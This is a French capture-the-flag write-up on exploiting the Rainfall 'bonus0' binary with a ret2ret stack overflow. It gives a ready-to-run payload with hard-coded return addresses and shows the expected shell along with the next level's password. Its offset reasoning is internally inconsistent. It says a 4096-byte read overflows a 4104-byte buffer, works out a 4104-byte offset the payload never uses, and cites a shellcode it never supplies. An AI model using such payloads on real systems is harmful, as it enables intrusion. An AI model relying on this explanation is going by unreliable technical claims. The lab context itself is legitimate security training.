# Write-up : Rainfall - Bonus0 (ret2ret / ret2libc)

## 🎯 Objectif

Exploiter le binaire `bonus0` pour obtenir un shell, via un **ret2ret** ou **ret2libc**.

---

## 🔍 Analyse du binaire

### Fonction `p()`

```asm
0x080484b7 <+3>:    sub    $0x1018,%esp   ; réserve 4120 octets (stack frame)
0x080484d0 <+28>:   lea    -0x1008(%ebp),%eax   ; buffer de 4104 octets
0x080484e1 <+45>:   call   read(0, eax, 0x1000) ; lit 4096 octets dans le buffer
```

📌 Le `read()` lit directement dans un buffer local de grande taille. Cela permet un **overflow contrôlé** vers le `RET` de `p()` si on dépasse les 4104 octets.

---

## 🔢 Calcul des offsets

### 🧠 Premier `read()` (via 1er appel à `p()`)

* Ce buffer est utilisé dans un `strcpy()` puis `strcat()`
* Objectif : remplir jusqu'à `strlen(buffer1)` = 20, pour que l’instruction suivante tombe au bon endroit :

  ```asm
  mov %dx, (buffer1 + strlen(buffer1))
  ```
* ✅ **Offset = 20 octets** permet d’aligner parfaitement

### 🧠 Deuxième `read()` (2e appel à `p()`)

* On cherche à écraser le `RET` de `main()` via `strcat()`
* Calcul : `RET = ebp + 4`, `buffer = ebp - 0x1008`
  → Offset total = `0x1008 + 4 = 4104`
* ✅ **Offset = 4104 octets** pour atteindre le `RET`

---

## 🚀 Exploitation : ret2ret / redirection de retour

### Final payload :

```bash
(python -c 'print "A"*20'; python -c 'print "AAAAAAAAA" + "\xcb\x85\x04\x08" + "\xfc\xfb\xff\xbf" + "AAA"'; cat) | ./bonus0
```

### Décomposé :

* `"A"*20` → premier `read()` (alignement `strlen = 20`)
* `"A"*9` → padding
* `\xcb\x85\x04\x08` → `0x080485cb` = instruction `ret` dans `main()`
* `\xfc\xfb\xff\xbf` → `0xbffffbfc`, adresse vers le shellcode (ou `/bin/sh`) dans la stack
* `"AAA"` → padding

> ✅ Cela écrase le `RET` de `main()` → saute vers `ret` → puis `ret` vers notre adresse contrôlée

C’est un **ret2ret** classique 🌀

---

## 🧠 Bilan pédagogique

1. On a commencé par comprendre la structure du binaire
2. On a repéré un buffer overflow via `read()` sans limites
3. On a cherché les bons **offsets** (20, 4104)
4. On a compris que le `RET` final est celui de `main()`
5. On a redirigé le `RET` vers un `ret`, puis vers un shellcode ou `/bin/sh`

---

## ✅ Résultat attendu

```bash
$ whoami
bonus0
$ cat /home/user/bonus1/.pass
<cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9>
```

---

## 🎉 Bravo

Si ce payload vous donne un shell, alors vous avez :

* Contrôlé la stack
* Écrasé le retour
* Redirigé l’exécution